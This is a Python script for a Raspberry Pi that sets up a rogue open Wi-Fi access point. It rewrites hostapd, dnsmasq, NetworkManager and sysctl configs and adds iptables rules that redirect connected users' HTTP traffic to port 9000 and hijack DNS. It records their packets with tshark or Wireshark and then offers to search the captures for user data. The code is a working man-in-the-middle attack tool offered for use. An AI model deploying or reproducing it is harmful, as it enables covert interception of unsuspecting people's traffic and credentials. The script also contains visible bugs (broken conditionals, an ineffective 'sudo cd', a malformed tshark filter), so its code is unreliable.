import os
import time

header = 'MITM rogue access point program for Raspberry Pi 3 B+ ' \
         'Created by Marius'

sudo = '/usr/bin/sudo'
tee = '/usr/bin/tee'

try:
    update = 'n'
    # update = input('\n(?) Do you want to update/install dependecies? y/n: ')
    update = update.lower()
    if update == 'y' or '':
        print('\033[1;32m\n(I) Installing/updating dependencies\033[1;m')
        os.system('sudo apt -y update && apt -y upgrade && apt -y dist-upgrade')
        os.system('sudo apt install dnsmasq -y')
        os.system('sudo apt install wireshark -y')
        os.system('sudo apt install hostapd -y')
        os.system('sudo apt install python-pip')
        os.system('sudo apt install python3-pip')
        os.system('sudo apt-get install python3-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev '
                  'libjpeg62-turbo-dev zlib1g-dev -y')
        os.system('sudo apt install libpcap-dev -y')
        os.system('sudo apt install mitmproxy -y')
        os.system('sudo apt install dhcpcd5 -y')
        os.system('sudo apt install screen -y')

    access_interface = 'wlan0'
    # access_interface = input('\n(?) What is the name of the access point interface? ')
    internet_interface = 'eth0'
    # internet_interface = input('\n(?) What is the name of the internet interface? ')
    networkmanager_config = ('[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:' +
                             access_interface)
    print('\033[1;32m\n(I) Saving NetworkManager.conf if it exists\033[1;m')
    os.system('sudo service NetworkManager stop')
    if os.path.isfile('/etc/NetworkManager/NetworkManager.conf'):
        os.system('sudo mv /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup')
    print('\033[1;32m(I) Creating/editing NetworkManager.conf\033[1;m')
    if not os.path.exists('/etc/NetworkManager/NetworkManager.conf'):
        fobject = open('/etc/NetworkManager/NetworkManager.conf', 'w')
        fobject.write(networkmanager_config)
        fobject.close()

    print('\033[1;32m(I) Restarting service and interface\033[1;m')
    os.system('sudo ifconfig ' + access_interface + ' down')
    time.sleep(1)
    os.system('sudo ifconfig ' + access_interface + ' up')

    ssid = 'Test-nett'
    # ssid = input('\n(?) What is the SSID of the network? ')

    channel = '6'
    # channel = input('\n(?) Please enter a channel for the network (1-13): ')
    if channel.isdigit():
        pass
    else:
         print('(?) Please enter a valid channel between 1 and 13: \033')

    wifi_password = 'n'
    # wifi_password = input('\n(?) Do you want the network to be password protected? ')
    wifi_password = wifi_password.lower()
    if wifi_password == 'y' or '':
        wifi_password = input('\n(?) Please enter the password: ')
        hostapd_config = ('interface=' + access_interface + '\ndriver=nl80211\nssid=' + ssid + '\nhw_mode=g\nchannel='
                          + channel + '\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase='
                          + wifi_password + '\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP')
    else:
        hostapd_config = ('interface=' + access_interface + '\ndriver=nl80211\nssid=' + ssid + '\nhw_mode=g\nchannel=' +
                          channel + '\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0')

    print('\033[1;32m\n(I) Saving old hostapd config file\033[1;m')
    if os.path.isfile('/etc/hostapd/hostapd.conf'):
        os.system('sudo mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.backup')
    print('\033[1;32m(I) Creating new hostapd config file\033[1;m')
    if not os.path.isfile('/etc/hostapd/hostapd.conf'):
        fobject = open('/etc/hostapd/hostapd.conf', 'w')
        fobject.write(hostapd_config)
        fobject.close()

    print('\033[1;32m\nThe default IP address is 192.168.50.1/24\033[1;m')
    ip_address = '192.168.50.1'
    # ip_address = input('\n(?) What IP address do you want to have on the access point? ')
    print('\033[1;32m\n(I) Configuring access point interface\033[1;m')
    os.system('sudo ifconfig ' + access_interface + ' up ' + ip_address + ' netmask 255.255.255.0')
    print('\033[1;32m(I) Setting up IP tables\033[1;m')
    os.system('sudo iptables -F')
    os.system('sudo iptables -t nat -F')
    os.system('sudo iptables -X')
    os.system('sudo iptables -t nat -X')
    os.system('sudo iptables -t nat -A POSTROUTING -o ' + internet_interface + ' -j MASQUERADE')
    os.system('sudo iptables -A FORWARD -i ' + access_interface + ' -j ACCEPT')

    capture_wireshark = 'n'
    # capture_wireshark = input('\n(?) Do you want to start Wireshark on ' + access_interface + '? ')
    capture_wireshark = capture_wireshark.lower()

    capture_tshark = 'n'
    # capture_tshark = input('\n(?) Do you want to start Tshark on ' + access_interface + ' (No GUI needed)? ')
    capture_tshark = capture_tshark.lower()

    print('\033[1;32m\nCreating directory for logs in /root/Documents/\033[1;m')
    log_files = '/root/Documents/MITM-logs'
    if not os.path.exists('/root/Documents/MITM-logs'):
        os.system('sudo mkdir /root/Documents/MITM-logs')

    os.system('sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000')
    os.system('sudo iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53')
    os.system('sudo iptables -t nat -A PREROUTING -p tcp --destination-port 53 -j REDIRECT --to-port 53')

    dnsmasq_config = ('#Disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n'
                      '#Interface to bind to\ninterface=' + access_interface +
                      '\n#Specify starting_range,end_range,lease_time\ndhcp-range=192.168.50.10,192.168.50.50,12h\n'
                      '# dns addresses to send to the clients\nserver=8.8.8.8\nserver=' + ip_address + '\n')

    print('\033[1;32m(I) Configuring DHCP server\033[1;m')
    if os.path.isfile('/etc/dnsmasq.conf'):
        os.system('sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.backup')
    print('\033[1;32m(I) Creating new DHCP config file\033[1;m')
    if not os.path.isfile('/etc/dnsmasq.conf'):
        fobject = open('/etc/dnsmasq.conf', 'w')
        fobject.write(dnsmasq_config)
        fobject.close()

    print('\033[1;32m\n(I) Restarting DHCP server\033[1;m')
    os.system('sudo /etc/init.d/dnsmasq stop')
    os.system('sudo pkill -f dnsmasq')
    os.system('sudo dnsmasq -C /etc/dnsmasq.conf')

    packet_forwarding = 'net.ipv4.ip_forward=1'
    print('\033[1;32m\n(I) Creating rule to foward IP packets')
    if os.path.isfile('/etc/sysctl.conf'):
        os.system('sudo mv /etc/sysctl.conf /etc/sysctl.conf.backup')
    if not os.path.isfile('/etc/sysctl.conf'):
        fobject = open('/etc/sysctl.conf', 'w')
        fobject.write(packet_forwarding)
        fobject.close()

    if capture_wireshark == 'y' or '':
        print('\033[1;32m(I) Starting Wireshark\033[1;m')
        os.system('sudo screen -S MITM-Wireshark -m -d wireshark -i ' + access_interface + ' -k -w ' +
                  log_files + '/MITM-Wireshark.pcap')

    if capture_tshark == 'y' or '':
        print('\033[1;32m(I) Starting Tshark\033[1;m')
        os.system('sudo screen -S MITM-Tshark -m -d tshark -i ' + access_interface + ' -w ' + log_files +
                  '/MITM-Tshark.pcap')

    print('\033[1;32m(I) Starting access point on ' + access_interface + '\033[1;m')
    os.system('sudo hostapd /etc/hostapd/hostapd.conf')

    print('')
    print('\033[1;32m\n\n(I) Something went wrong, cancelling script\033[1;m')
    os.system('sudo screen -S MITM-Hostapd -X Stuff "^C\n"')

    if capture_wireshark == 'y' or '':
        os.system('sudo screen -S MITM-Wireshark -X Stuff "^C\n"')
        os.system('sudo pkill -f wireshark')

    if capture_tshark == 'y' or '':
        os.system('sudo screen -S MITM-Tshark -X Stuff "^C\n"')

    print('\033[1;32m(I) Restoring old NetworkManager.conf file if there was any\033[1;m')
    if os.path.isfile('/etc/NetworkManager/NetworkManager.conf.backup'):
        os.system('sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf '
                  '> /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Restoring config files\033[1;m')
    if os.path.isfile('/etc/dnsmasq.conf.backup'):
        os.system('sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/dnsmasq.conf > /dev/null 2>&1')

    if os.path.isfile('/etc/hostapd/hostapd.conf.backup'):
        os.system('sudo mv /etc/hostapd/hostapd.conf.backup /etc/hostapd/hostapd.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1')

    if os.path.isfile('/etc/sysctl.conf.backup'):
        os.system('sudo mv /etc/sysctl.conf.backup /etc/sysctl.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/sysctl.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Flushing iptable configs')
    os.system("sudo iptables -F")
    os.system("sudo iptables -F -t nat")
    os.system("sudo iptables -X")
    os.system("sudo iptables -t nat -X")
    print('\033[1;32m(I) Restarting all services\033[1;m')
    os.system('sudo service NetworkManager stop')
    os.system('sudo pkill -f dnsmasq')
    os.system('sudo service dnsmasq stop')
    os.system('sudo service hostapd stop')
    print('\033[1;32m(I) MITM has stopped\033[1;m')

except KeyboardInterrupt:
    print('\033[1;32m\n\n(I) Cancelling script\033[1;m')
    os.system('sudo screen -S MITM-Hostapd -X Stuff "^C\n"')

    if capture_wireshark == 'y' or '':
        os.system('sudo screen -S MITM-Wireshark -X Stuff "^C\n"')
        os.system('sudo pkill -f wireshark')

    if capture_tshark == 'y' or '':
        os.system('sudo screen -S MITM-Tshark -X Stuff "^C\n"')

    print('\033[1;32m(I) Restoring old NetworkManager.conf file if there was any\033[1;m')
    if os.path.isfile('/etc/NetworkManager/NetworkManager.conf.backup'):
        os.system('sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf '
                  '> /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Restoring dnsmasq and hostapd config files\033[1;m')
    if os.path.isfile('/etc/dnsmasq.conf.backup'):
        os.system('sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/dnsmasq.conf > /dev/null 2>&1')

    if os.path.isfile('/etc/hostapd/hostapd.conf.backup'):
        os.system('sudo mv /etc/hostapd/hostapd.conf.backup /etc/hostapd/hostapd.conf > /dev/null 2>&1')
    else:
        os.system('sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1')

    print('\033[1;32m(I) Restarting the service NetworkManager\033[1;m')
    os.system('sudo service NetworkManager stop')
    os.system('sudo pkill -f dnsmasq')
    os.system('sudo service dnsmasq stop')
    os.system('sudo service hostapd stop')
    print('\033[1;32m(I) Flushing iptable configs\033[1;m')
    os.system('sudo iptables -F')
    os.system('sudo iptables -F -t nat')
    os.system('sudo iptables -X')
    os.system('sudo iptables -t nat -X')
    print('\033[1;32m(I) MITM has stopped\033[1;m')
    print('\033[1;32m(I) Captured data are stored in the MITM-log directory\033[1;m')

    search_data = input('(?) Would you like to search through the packets sniffed for userdata? ')
    search_data = search_data.lower()
    if search_data == 'y' or '':
        search_word = input('\n(?) What is the word you would like to search for? ')
        os.system('sudo cd ' + log_files)
        frame_contains = "'frame contains '"
        os.system('tshark -nr input.pcap -Y ' + frame_contains + search_word + '-w output.pcap')